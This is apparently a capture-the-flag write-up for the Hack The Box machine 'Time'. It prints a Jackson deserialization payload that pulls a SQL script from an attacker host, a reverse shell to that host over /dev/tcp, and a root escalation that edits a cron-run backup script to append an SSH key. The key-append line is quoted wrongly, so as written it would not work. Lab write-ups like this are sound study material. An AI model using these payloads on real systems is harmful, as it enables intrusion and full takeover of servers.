# time

## nmap

[Scan results][1]

From scan results seems there is a json parser on port 80

## The json parse

The beautify option doesnt work and validate is a beta function. Trying to use the validate form the site return:
`Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object`

After a reasearch we find an [RCE vulnerability for Jackson][2] that we can use to build a modified `inject.sql` to recieve a reverse shell

to upload the revers shell we need to put inside the validation form this payload

```raw
["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.217:8000/inject.sql'"}]
```

inject.sql:

```java
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -i &>/dev/tcp/10.10.14.217/9001 0>&1 &')
```

and we get user `pericles`

## Going Root

Let's get a bit of enumeration by [Linpeas][3]

Seems that the user pericles own the script `/usr/bin/timer_backup.sh`

```bash
#!/bin/bash
zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
```

Seems that this script can write inside root directory so maybe it's scheduled to run as root we can try to modify to add our ssh key into the authorized and login

```bash
#!/bin/bash
zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
echo "SSH_PUB_KEY >> /root/.ssh/authorized_keys"
```

![htbbadge](https://www.hackthebox.eu/badge/image/272787)
![achievement](https://www.hackthebox.eu/storage/achievements/aa916215fbb507d8a77cf2606dda7394.png)

[//]: #links
[1]: nmap/time.nmap
[2]: https://github.com/jas502n/CVE-2019-12384
[3]: linpeas.txt
